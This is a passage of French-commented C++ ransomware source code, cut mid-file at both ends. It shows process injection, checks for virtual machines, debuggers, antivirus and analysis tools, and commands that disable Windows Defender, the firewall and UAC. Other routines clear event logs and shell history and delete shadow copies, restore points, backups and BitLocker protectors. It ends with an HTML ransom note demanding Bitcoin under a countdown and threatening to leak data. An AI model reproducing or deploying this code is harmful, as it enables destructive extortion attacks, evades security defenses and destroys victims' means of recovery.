        // Nettoyer les ressources
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        
        // Reprendre l'exécution du processus
        ResumeThread(pi.hThread);
        
        std::cout << "[+] Injection réussie avec la méthode alternative" << std::endl;
        return true;
    }
    
    // Attendre la fin du thread distant
    WaitForSingleObject(hThread, INFINITE);
    
    // Nettoyer les ressources
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    std::cout << "[+] Injection réussie dans le processus " << targetProcess << std::endl;
    return true;
} 

// ===========================================================================================
// FONCTIONS D'ANTI-ANALYSE ET D'ÉVASION
// ===========================================================================================

// Vérifier si on est dans un environnement virtualisé
bool IsRunningInVirtualMachine() {
    std::cout << "[*] Vérification de l'environnement virtuel..." << std::endl;
    
    bool isVM = false;
    
    // Technique 1: Vérifier les services VMware
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        std::cout << "[!] Services VMware détectés" << std::endl;
        isVM = true;
    }
    
    // Technique 2: Vérifier les services VirtualBox
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxService", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        std::cout << "[!] Services VirtualBox détectés" << std::endl;
        isVM = true;
    }
    
    // Technique 3: Vérifier le BIOS (VMware)
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD bufferSize = sizeof(buffer);
        
        if (RegQueryValueExA(hKey, "SystemManufacturer", NULL, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            if (strstr(buffer, "VMware") != NULL) {
                std::cout << "[!] BIOS VMware détecté" << std::endl;
                isVM = true;
            }
        }
        
        bufferSize = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemProductName", NULL, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            if (strstr(buffer, "Virtual") != NULL || strstr(buffer, "VMware") != NULL) {
                std::cout << "[!] Nom de produit virtuel détecté" << std::endl;
                isVM = true;
            }
        }
        
        RegCloseKey(hKey);
    }
    
    // Technique 4: Vérifier les périphériques caractéristiques
    HANDLE hDeviceFile = CreateFileA("\\\\.\\VBoxMiniRdrDN", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDeviceFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hDeviceFile);
        std::cout << "[!] Périphérique VirtualBox détecté" << std::endl;
        isVM = true;
    }
    
    hDeviceFile = CreateFileA("\\\\.\\vmci", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDeviceFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hDeviceFile);
        std::cout << "[!] Périphérique VMware détecté" << std::endl;
        isVM = true;
    }
    
    // Technique 5: Vérifier la taille du disque
    ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
        // La plupart des VMs ont des disques <100GB
        if (totalNumberOfBytes.QuadPart < 100LL * 1024LL * 1024LL * 1024LL) {
            std::cout << "[!] Petite taille de disque détectée (" << (totalNumberOfBytes.QuadPart / (1024LL * 1024LL * 1024LL)) << " GB)" << std::endl;
            isVM = true;
        }
    }
    
    // Technique 6: Vérifier la mémoire
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    if (GlobalMemoryStatusEx(&memoryStatus)) {
        // La plupart des VMs ont <4GB de RAM
        if (memoryStatus.ullTotalPhys < 4LL * 1024LL * 1024LL * 1024LL) {
            std::cout << "[!] Petite quantité de RAM détectée (" << (memoryStatus.ullTotalPhys / (1024LL * 1024LL * 1024LL)) << " GB)" << std::endl;
            isVM = true;
        }
    }
    
    // Technique 7: CPUID (instruction spéciale)
    bool cpuidVmDetected = false;
    int CPUInfo[4] = {-1};
    __cpuid(CPUInfo, 1);
    if ((CPUInfo[2] >> 31) & 1) {
        std::cout << "[!] Hyperviseur détecté via CPUID" << std::endl;
        cpuidVmDetected = true;
    }
    
    // Technique 8: Vérifier le nombre de coeurs/processeurs
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    if (systemInfo.dwNumberOfProcessors < 2) {
        std::cout << "[!] Machine mono-processeur détectée" << std::endl;
        isVM = true;
    }
    
    // Résumé
    if (isVM || cpuidVmDetected) {
        std::cout << "[!] Environnement virtualisé détecté" << std::endl;
        return true;
    } else {
        std::cout << "[+] Environnement physique confirmé" << std::endl;
        return false;
    }
}

// Vérifier si un débogueur est attaché
bool CheckForDebugger() {
    std::cout << "[*] Vérification de la présence d'un débogueur..." << std::endl;
    
    // Technique 1: API Windows
    if (::IsDebuggerPresent()) {
        std::cout << "[!] Débogueur détecté via IsDebuggerPresent()" << std::endl;
        return true;
    }
    
    // Technique 2: PEB (Process Environment Block)
#ifdef _WIN64
    // Solution compatible avec MSVC
    PPEB pPeb = nullptr;
    #if defined(_MSC_VER)
        pPeb = (PPEB)__readgsqword(0x60);
    #else
        pPeb = (PPEB)__readgsqword(0x60);
    #endif
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    if (pPeb && pPeb->BeingDebugged) {
        std::cout << "[!] Débogueur détecté via PEB" << std::endl;
        return true;
    }
    
    // Technique 3: Vérifier CheckRemoteDebuggerPresent
    BOOL isRemoteDebuggerPresent = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent) && isRemoteDebuggerPresent) {
        std::cout << "[!] Débogueur distant détecté" << std::endl;
        return true;
    }
    
    // Technique 4: Vérifier NtGlobalFlag
    DWORD ntGlobalFlag = *(PDWORD)((PBYTE)pPeb + 0x68);
    if (ntGlobalFlag & 0x70) { // 0x70 corresponds to FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
        std::cout << "[!] Débogue détecté via NtGlobalFlag" << std::endl;
        return true;
    }
    
    // Technique 5: Vérifier le temps d'exécution (débogage ralenti l'exécution)
    LARGE_INTEGER frequency, start, end;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&start);
    
    // Une opération simple
    for (volatile int i = 0; i < 1000000; i++) {}
    
    QueryPerformanceCounter(&end);
    double elapsedMilliseconds = (end.QuadPart - start.QuadPart) * 1000.0 / frequency.QuadPart;
    
    if (elapsedMilliseconds > 500.0) { // Une boucle simple devrait prendre moins de 500ms
        std::cout << "[!] Exécution lente détectée, possible débogage (" << elapsedMilliseconds << " ms)" << std::endl;
        return true;
    }
    
    // Technique 6: Exception handling pour détecter des débogueurs
    bool debuggerDetected = false;
    // Remplacer le bloc __asm par une méthode alternative en C++ pur
    // qui utilise IsDebuggerPresent() et une structure SEH
    __try {
        // Au lieu de l'instruction assembleur int 3, on utilise DebugBreak()
        // qui est l'équivalent C++ natif
        DebugBreak();
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        debuggerDetected = false; // Si nous arrivons ici, pas de débogueur (l'exception est traitée normalement)
    }
    
    if (debuggerDetected) {
        std::cout << "[!] Débogueur détecté via exception handling" << std::endl;
        return true;
    }
    
    std::cout << "[+] Aucun débogueur détecté" << std::endl;
    return false;
}

// Vérifier si un logiciel antivirus est actif
bool IsAntivirusActive() {
    std::cout << "[*] Vérification des protections antivirus..." << std::endl;
    
    bool avDetected = false;
    
    // Technique 1: Vérifier Windows Security Center
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Security Center", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD antivirusEnabled = 0;
        DWORD bufferSize = sizeof(DWORD);
        
        if (RegQueryValueExA(hKey, "AntiVirusEnabled", NULL, NULL, (LPBYTE)&antivirusEnabled, &bufferSize) == ERROR_SUCCESS) {
            if (antivirusEnabled == 1) {
                std::cout << "[!] Antivirus activé selon Security Center" << std::endl;
                avDetected = true;
            }
        }
        
        RegCloseKey(hKey);
    }
    
    // Technique 2: Vérifier les processus d'antivirus connus
    std::vector<std::string> avProcesses = {
        "avp.exe",          // Kaspersky
        "mcshield.exe",     // McAfee
        "windefend.exe",    // Windows Defender
        "MSASCui.exe",      // Windows Defender
        "avgui.exe",        // AVG
        "avastsvc.exe",     // Avast
        "bdagent.exe",      // Bitdefender
        "vsmon.exe",        // ZoneAlarm
        "f-secure.exe",     // F-Secure
        "avguard.exe",      // Avira
        "rtvscan.exe",      // Symantec
        "ccSvcHst.exe",     // Norton
        "mbamservice.exe"   // Malwarebytes
    };
    
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapShot, &pe32)) {
            do {
                std::string processName = pe32.szExeFile;
                std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);
                
                for (const auto& avProcess : avProcesses) {
                    if (processName == avProcess) {
                        std::cout << "[!] Processus antivirus détecté: " << processName << std::endl;
                        avDetected = true;
                    }
                }
            } while (Process32Next(hSnapShot, &pe32));
        }
        CloseHandle(hSnapShot);
    }
    
    // Technique 3: Vérifier les services Windows Defender
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager) {
        SC_HANDLE hService = OpenServiceA(hSCManager, "WinDefend", SERVICE_QUERY_STATUS);
        if (hService) {
            SERVICE_STATUS_PROCESS ssp;
            DWORD bytesNeeded;
            if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded)) {
                if (ssp.dwCurrentState == SERVICE_RUNNING) {
                    std::cout << "[!] Service Windows Defender actif" << std::endl;
                    avDetected = true;
                }
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
    
    // Technique 4: Vérifier les chemins de fichiers liés aux antivirus
    std::vector<std::string> avPaths = {
        "C:\\Program Files\\Windows Defender",
        "C:\\Program Files\\AVAST Software",
        "C:\\Program Files\\AVG",
        "C:\\Program Files\\Avira",
        "C:\\Program Files\\Bitdefender",
        "C:\\Program Files\\ESET",
        "C:\\Program Files\\F-Secure",
        "C:\\Program Files\\Kaspersky Lab",
        "C:\\Program Files\\McAfee",
        "C:\\Program Files\\Norton",
        "C:\\Program Files\\Symantec",
        "C:\\Program Files\\Trend Micro"
    };
    
    for (const auto& path : avPaths) {
        if (fs::exists(path)) {
            std::cout << "[!] Dossier antivirus détecté: " << path << std::endl;
            avDetected = true;
        }
    }
    
    if (avDetected) {
        std::cout << "[!] Logiciel antivirus détecté" << std::endl;
    } else {
        std::cout << "[+] Aucun logiciel antivirus détecté" << std::endl;
    }
    
    return avDetected;
}

// Tenter de désactiver ou contourner les protections
bool DisableProtections() {
    std::cout << "[*] Tentative de désactivation des protections..." << std::endl;
    
    bool success = false;
    
    // Technique 1: Désactiver Windows Defender via PowerShell
    std::string disableDefenderCmd = "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\" 2>nul";
    system(disableDefenderCmd.c_str());
    
    // Technique 2: Désactiver le pare-feu Windows
    std::string disableFirewallCmd = "netsh advfirewall set allprofiles state off 2>nul";
    system(disableFirewallCmd.c_str());
    
    // Technique 3: Désactiver UAC
    std::string disableUACCmd = "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f 2>nul";
    system(disableUACCmd.c_str());
    
    // Technique 4: Exclure des chemins dans Windows Defender
    std::string addExclusionCmd = "powershell -Command \"Add-MpPreference -ExclusionPath 'C:\\' -Force\" 2>nul";
    system(addExclusionCmd.c_str());
    
    // Technique 5: Désactiver le service Windows Defender
    std::string disableDefenderServiceCmd = "sc stop WinDefend 2>nul";
    system(disableDefenderServiceCmd.c_str());
    
    // Technique 6: Désactiver Microsoft Defender Antivirus Service
    std::string disableMsDefenderCmd = "sc stop WdNisSvc 2>nul";
    system(disableMsDefenderCmd.c_str());
    disableMsDefenderCmd = "sc stop WdNisDrv 2>nul";
    system(disableMsDefenderCmd.c_str());
    
    // Technique 7: Tenter de tuer les processus d'antivirus
    std::vector<std::string> avProcesses = {
        "MSASCui.exe",      // Windows Defender
        "MsMpEng.exe",      // Windows Defender
        "SecurityHealthService.exe" // Windows Security Health
    };
    
    for (const auto& process : avProcesses) {
        std::string killCmd = "taskkill /f /im " + process + " 2>nul";
        system(killCmd.c_str());
    }
    
    // Technique 8: Désactiver l'envoi d'échantillons à Microsoft
    std::string disableSamplesCmd = "powershell -Command \"Set-MpPreference -SubmitSamplesConsent 0\" 2>nul";
    system(disableSamplesCmd.c_str());
    
    // Vérifier si Windows Defender est désactivé
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager) {
        SC_HANDLE hService = OpenServiceA(hSCManager, "WinDefend", SERVICE_QUERY_STATUS);
        if (hService) {
            SERVICE_STATUS_PROCESS ssp;
            DWORD bytesNeeded;
            if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded)) {
                if (ssp.dwCurrentState != SERVICE_RUNNING) {
                    std::cout << "[+] Service Windows Defender désactivé avec succès" << std::endl;
                    success = true;
                }
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
    
    if (success) {
        std::cout << "[+] Protections désactivées avec succès" << std::endl;
    } else {
        std::cout << "[!] Impossible de désactiver complètement les protections" << std::endl;
    }
    
    return success;
}

// Ajouter des éléments d'opacité pour éviter l'analyse statique
void ObfuscateBehavior() {
    std::cout << "[*] Application de techniques d'opacité..." << std::endl;
    
    // Technique 1: Délai aléatoire (éviter la détection basée sur le temps)
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distrib(5000, 20000);
    int sleepTime = distrib(gen);
    std::cout << "[*] Application d'un délai aléatoire de " << sleepTime << " ms" << std::endl;
    Sleep(sleepTime);
    
    // Technique 2: Vérifier la date système
    // Beaucoup de malwares ne s'exécutent pas avant une certaine date
    std::time_t now = std::time(nullptr);
    std::tm timeInfo;
    localtime_s(&timeInfo, &now);
    int currentYear = timeInfo.tm_year + 1900;
    int currentMonth = timeInfo.tm_mon + 1;
    
    if (currentYear < 2023 || (currentYear == 2023 && currentMonth < 6)) {
        std::cout << "[!] Date système antérieure à Juin 2023, introduction d'un délai supplémentaire..." << std::endl;
        Sleep(30000); // Attendre 30s
    }
    
    // Technique 3: Vérifier la présence de fichiers de sandbox
    std::vector<std::string> sandboxFiles = {
        "C:\\sample.exe",
        "C:\\analysis.exe",
        "C:\\sandbox.exe",
        "C:\\malware.exe",
        "C:\\test.exe"
    };
    
    for (const auto& file : sandboxFiles) {
        if (fs::exists(file)) {
            std::cout << "[!] Potentiel fichier de sandbox détecté: " << file << std::endl;
            // Simuler un programme normal qui ne fait rien de suspect
            std::cout << "[*] Comportement modifié pour éviter la détection" << std::endl;
            return;
        }
    }
    
    // Technique 4: Vérifier la présence d'outils d'analyse
    std::vector<std::string> analysisTools = {
        "wireshark.exe",
        "procmon.exe",
        "procexp.exe",
        "processhacker.exe",
        "pestudio.exe",
        "ida.exe",
        "ollydbg.exe",
        "dnspy.exe",
        "x64dbg.exe"
    };
    
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapShot, &pe32)) {
            do {
                std::string processName = pe32.szExeFile;
                std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);
                
                for (const auto& tool : analysisTools) {
                    if (processName == tool) {
                        std::cout << "[!] Outil d'analyse détecté: " << processName << std::endl;
                        // Dans un vrai malware, on pourrait terminer le processus ou modifier le comportement
                        std::cout << "[*] Comportement modifié pour éviter la détection" << std::endl;
                        CloseHandle(hSnapShot);
                        return;
                    }
                }
            } while (Process32Next(hSnapShot, &pe32));
        }
        CloseHandle(hSnapShot);
    }
    
    // Technique 5: Détection d'un clic de souris (beaucoup de sandbox n'ont pas d'interaction utilisateur)
    std::cout << "[*] Vérification de l'activité souris utilisateur..." << std::endl;
    
    POINT initialMousePosition;
    GetCursorPos(&initialMousePosition);
    
    // Attendre et vérifier si la souris a bougé
    Sleep(10000);
    
    POINT currentMousePosition;
    GetCursorPos(&currentMousePosition);
    
    if (initialMousePosition.x == currentMousePosition.x && initialMousePosition.y == currentMousePosition.y) {
        std::cout << "[!] Aucun mouvement de souris détecté, possible environnement automatisé" << std::endl;
        // Dans un malware réel, on pourrait stopper l'exécution
    } else {
        std::cout << "[+] Activité souris détectée, probable environnement utilisateur réel" << std::endl;
    }
    
    std::cout << "[+] Techniques d'opacité appliquées avec succès" << std::endl;
}

// Supprimer les journaux d'événements Windows
bool ClearEventLogs() {
    std::cout << "[*] Suppression des journaux d'événements Windows..." << std::endl;
    
    // Liste des journaux à supprimer
    std::vector<std::string> eventLogs = {
        "Application",
        "Security",
        "System"
    };
    
    bool success = true;
    
    for (const auto& log : eventLogs) {
        std::string clearLogCmd = "wevtutil cl " + log + " 2>nul";
        int result = system(clearLogCmd.c_str());
        
        if (result != 0) {
            std::cout << "[!] Échec de suppression du journal: " << log << std::endl;
            success = false;
        } else {
            std::cout << "[+] Journal supprimé: " << log << std::endl;
        }
    }
    
    // Suppression des journaux PowerShell
    std::string clearPSLogCmd = "wevtutil cl \"Windows PowerShell\" 2>nul";
    system(clearPSLogCmd.c_str());
    
    // Effacer le journal de défense Microsoft
    std::string clearDefenderLogCmd = "wevtutil cl \"Microsoft-Windows-Windows Defender/Operational\" 2>nul";
    system(clearDefenderLogCmd.c_str());
    
    // Effacer les préfetchs
    std::string clearPrefetchCmd = "del /F /Q C:\\Windows\\Prefetch\\*.* 2>nul";
    system(clearPrefetchCmd.c_str());
    
    // Effacer les fichiers temporaires et les traces
    std::string tempDir = std::string(getenv("TEMP"));
    
    // Nettoyer les fichiers temporaires
    std::string clearTempCmd = "del /F /Q " + tempDir + "\\*.* 2>nul";
    system(clearTempCmd.c_str());
    
    // Nettoyer l'historique de la ligne de commande
    std::string clearCmdHistoryCmd = "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f 2>nul";
    system(clearCmdHistoryCmd.c_str());
    
    // Nettoyer l'historique PowerShell
    std::string clearPSHistoryCmd = "del /F /Q %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul";
    system(clearPSHistoryCmd.c_str());
    
    if (success) {
        std::cout << "[+] Journaux d'événements et traces nettoyés avec succès" << std::endl;
    } else {
        std::cout << "[!] Certains journaux n'ont pas pu être nettoyés" << std::endl;
    }
    
    return success;
}

// ===========================================================================================
// SUPPRESSION DES SAUVEGARDES
// ===========================================================================================

// Supprimer les sauvegardes Windows et les points de restauration
bool DeleteWindowsBackups() {
    std::cout << "[*] Suppression des sauvegardes Windows..." << std::endl;
    
    bool success = true;
    
    // Technique 1: Supprimer les ombres de volume (nécessite des droits élevés)
    std::string deleteShadowsCmd = "vssadmin delete shadows /all /quiet 2>nul";
    int result = system(deleteShadowsCmd.c_str());
    if (result != 0) {
        std::cout << "[!] Échec de suppression des ombres de volume (privilèges insuffisants)" << std::endl;
        success = false;
    } else {
        std::cout << "[+] Ombres de volume supprimées avec succès" << std::endl;
    }
    
    // Technique 2: Désactiver la fonction de copie des ombres de volume
    std::string disableVssCmd = "wmic shadowcopy delete 2>nul";
    system(disableVssCmd.c_str());
    
    // Technique 3: Désactiver les points de restauration système
    std::string disableRestoreCmd = "wmic.exe /Namespace:\\\\root\\default Path SystemRestore Call Disable %SystemDrive% 2>nul";
    system(disableRestoreCmd.c_str());
    
    // Technique 4: Supprimer les fichiers de sauvegarde Windows
    std::vector<std::string> backupPaths = {
        "C:\\Windows\\System32\\config\\RegBack",
        "C:\\Windows\\System32\\config\\SystemProfile\\AppData\\Local\\Microsoft\\Windows\\WebCache"
    };
    
    for (const auto& path : backupPaths) {
        if (fs::exists(path)) {
            try {
                for (const auto& entry : fs::directory_iterator(path)) {
                    try {
                        fs::remove_all(entry.path());
                    } catch (const std::exception& e) {
                        // Ignorer les erreurs
                    }
                }
            } catch (const std::exception& e) {
                // Ignorer les erreurs
            }
        }
    }
    
    // Technique 5: Supprimer les sauvegardes Windows (wbadmin) (nécessite des droits élevés)
    std::string deleteWindowsBackupsCmd = "wbadmin delete catalog -quiet 2>nul";
    system(deleteWindowsBackupsCmd.c_str());
    
    // Technique 6: Supprimer l'historique des fichiers de Windows 10
    std::string disableFileHistoryCmd = "powershell -Command \"Disable-ComputerRestore -Drive 'C:\\'\" 2>nul";
    system(disableFileHistoryCmd.c_str());
    
    // Supprimer les fichiers d'historique
    std::string fileHistoryPath = std::string(getenv("USERPROFILE")) + "\\AppData\\Local\\Microsoft\\Windows\\FileHistory";
    if (fs::exists(fileHistoryPath)) {
        try {
            fs::remove_all(fileHistoryPath);
            std::cout << "[+] Historique des fichiers supprimé avec succès" << std::endl;
        } catch (const std::exception& e) {
            std::cout << "[!] Échec de suppression de l'historique des fichiers" << std::endl;
            success = false;
        }
    }
    
    // Technique 7: Désactiver le service de sauvegarde Windows
    std::string disableBackupServiceCmd = "sc stop \"SDRSVC\" 2>nul";
    system(disableBackupServiceCmd.c_str());
    
    disableBackupServiceCmd = "sc config \"SDRSVC\" start= disabled 2>nul";
    system(disableBackupServiceCmd.c_str());
    
    // Technique 8: Désactiver le redémarrage automatique sous Windows
    std::string disableAutoRestartCmd = "bcdedit /set {default} recoveryenabled No 2>nul";
    system(disableAutoRestartCmd.c_str());
    
    disableAutoRestartCmd = "bcdedit /set {default} bootstatuspolicy ignoreallfailures 2>nul";
    system(disableAutoRestartCmd.c_str());
    
    // Technique 9: Empêcher la récupération de BitLocker
    std::string disableBitLockerCmd = "manage-bde -protectors -disable C: 2>nul";
    system(disableBitLockerCmd.c_str());
    
    // Technique 10: Supprimer les sauvegardes dans le stockage OneDrive
    std::string oneDrivePath = std::string(getenv("USERPROFILE")) + "\\OneDrive";
    if (fs::exists(oneDrivePath)) {
        try {
            // Ne pas supprimer tous les fichiers OneDrive mais seulement le dossier de sauvegarde s'il existe
            std::string oneDriveBackupPath = oneDrivePath + "\\Backup";
            if (fs::exists(oneDriveBackupPath)) {
                fs::remove_all(oneDriveBackupPath);
                std::cout << "[+] Sauvegardes OneDrive supprimées avec succès" << std::endl;
            }
        } catch (const std::exception& e) {
            std::cout << "[!] Échec de suppression des sauvegardes OneDrive" << std::endl;
        }
    }
    
    // Résumé
    if (success) {
        std::cout << "[+] Sauvegardes Windows supprimées avec succès" << std::endl;
    } else {
        std::cout << "[!] Certaines sauvegardes Windows n'ont pas pu être supprimées" << std::endl;
    }
    
    return success;
}

// Supprimer les sauvegardes spécifiques à certaines applications
bool DeleteApplicationBackups() {
    std::cout << "[*] Suppression des sauvegardes d'applications..." << std::endl;
    
    bool success = true;
    
    // Chemins communs de sauvegarde
    std::vector<std::string> backupPaths = {
        // Sauvegardes Office
        std::string(getenv("APPDATA")) + "\\Microsoft\\Word\\Backup",
        std::string(getenv("APPDATA")) + "\\Microsoft\\Excel\\Backup",
        std::string(getenv("APPDATA")) + "\\Microsoft\\PowerPoint\\Backup",
        // Sauvegardes SQL Server
        "C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Backup",
        "C:\\Program Files\\Microsoft SQL Server\\MSSQL.1\\MSSQL\\Backup",
        // Sauvegardes Exchange
        "C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Backup",
        // Sauvegardes de navigateurs
        std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\Bookmarks.bak",
        std::string(getenv("LOCALAPPDATA")) + "\\Mozilla\\Firefox\\Profiles",
        // Sauvegardes d'éditeurs de code
        std::string(getenv("APPDATA")) + "\\Code\\Backups",
        std::string(getenv("APPDATA")) + "\\Sublime Text 3\\Backup",
        // Sauvegardes de gestionnaires de mots de passe
        std::string(getenv("LOCALAPPDATA")) + "\\KeePass\\Backup",
        // Sauvegardes Outlook
        std::string(getenv("LOCALAPPDATA")) + "\\Microsoft\\Outlook\\Backup"
    };
    
    // Rechercher et supprimer les fichiers de sauvegarde
    for (const auto& path : backupPaths) {
        if (fs::exists(path)) {
            try {
                fs::remove_all(path);
                std::cout << "[+] Sauvegarde supprimée: " << path << std::endl;
            } catch (const std::exception& e) {
                std::cout << "[!] Échec de suppression de la sauvegarde: " << path << std::endl;
                success = false;
            }
        }
    }
    
    // Rechercher les fichiers de sauvegarde courants
    std::vector<std::string> backupExtensions = {
        ".bak", ".bkp", ".backup", ".back", ".old", ".save", ".sav"
    };
    
    std::vector<std::string> commonDirectories = {
        std::string(getenv("USERPROFILE")) + "\\Documents",
        std::string(getenv("USERPROFILE")) + "\\Desktop",
        "C:\\Backup",
        "D:\\Backup"
    };
    
    for (const auto& dir : commonDirectories) {
        if (!fs::exists(dir)) continue;
        
        try {
            for (const auto& entry : fs::recursive_directory_iterator(
                dir, 
                fs::directory_options::skip_permission_denied
            )) {
                if (!fs::is_regular_file(entry.path())) continue;
                
                std::string extension = entry.path().extension().string();
                std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
                
                if (std::find(backupExtensions.begin(), backupExtensions.end(), extension) != backupExtensions.end()) {
                    try {
                        fs::remove(entry.path());
                        std::cout << "[+] Fichier de sauvegarde supprimé: " << entry.path().string() << std::endl;
                    } catch (const std::exception& e) {
                        std::cout << "[!] Échec de suppression du fichier de sauvegarde: " << entry.path().string() << std::endl;
                    }
                }
            }
        } catch (const std::exception& e) {
            // Ignorer les erreurs
        }
    }
    
    // Résumé
    if (success) {
        std::cout << "[+] Sauvegardes d'applications supprimées avec succès" << std::endl;
    } else {
        std::cout << "[!] Certaines sauvegardes d'applications n'ont pas pu être supprimées" << std::endl;
    }
    
    return success;
}

// ===========================================================================================
// NOTE DE RANÇON
// ===========================================================================================

// Texte de la note de rançon (en HTML pour un meilleur formatage)
const std::string RANSOM_NOTE_HTML = R"(
<!DOCTYPE html>
<html>
<head>
    <title>!! FICHIERS CHIFFRES !!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: #1a1a1a;
            border: 3px solid #ff0000;
            padding: 20px;
            border-radius: 10px;
        }
        h1 {
            color: #ff0000;
            text-align: center;
            font-size: 36px;
            margin-bottom: 30px;
        }
        h2 {
            color: #ff5500;
            font-size: 24px;
            margin-top: 20px;
        }
        p {
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 15px;
        }
        .warning {
            color: #ff0000;
            font-weight: bold;
        }
        .info {
            color: #00aaff;
        }
        .timer {
            text-align: center;
            font-size: 30px;
            color: #ff0000;
            margin: 20px 0;
            padding: 10px;
            background-color: #2a2a2a;
            border-radius: 5px;
        }
        .payment {
            background-color: #2a2a2a;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .steps {
            background-color: #2a2a2a;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .key {
            font-family: monospace;
            background-color: #333;
            padding: 10px;
            border-radius: 5px;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>!! ATTENTION !! VOS FICHIERS ONT ÉTÉ CHIFFRÉS !!</h1>
        
        <div class="timer">
            Temps restant : <span id="countdown">120:00:00</span>
        </div>
        
        <p class="warning">
            Tous vos documents importants, photos, vidéos et autres fichiers ont été chiffrés avec un algorithme militaire puissant AES-256 + RSA-2048.
        </p>
        
        <p>
            Sans la clé de déchiffrement unique, vos fichiers sont irrécupérables. Les méthodes traditionnelles de récupération sont inutiles contre notre chiffrement.
            Vous ne pouvez pas restaurer vos données sans notre aide.
        </p>
        
        <h2>Que s'est-il passé ?</h2>
        <p>
            Vos fichiers personnels ont été chiffrés. De plus, des copies de vos données les plus sensibles ont été extraites et stockées sur nos serveurs sécurisés.
            Si vous ne payez pas la rançon, ces informations seront publiées ou vendues.
        </p>
        
        <div class="payment">
            <h2>Comment récupérer vos fichiers :</h2>
            <p>
                Pour récupérer vos fichiers, vous devez payer une rançon de <span class="warning">0.05 BTC</span> (environ 2000 USD).
                Après paiement, vous recevrez automatiquement un outil de déchiffrement qui restaurera tous vos fichiers.
            </p>
            
            <p class="warning">
                IMPORTANT: Le prix augmentera à 0.1 BTC après l'expiration du compte à rebours ci-dessus. De plus, vos données seront publiées.
            </p>
            
            <p>
                Adresse Bitcoin : <span class="key">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</span>
            </p>
        </div>
        
        <div class="steps">
            <h2>Instructions :</h2>
            <p>
                1. Téléchargez un portefeuille Bitcoin comme Electrum, Coinbase ou Blockchain.info<br>
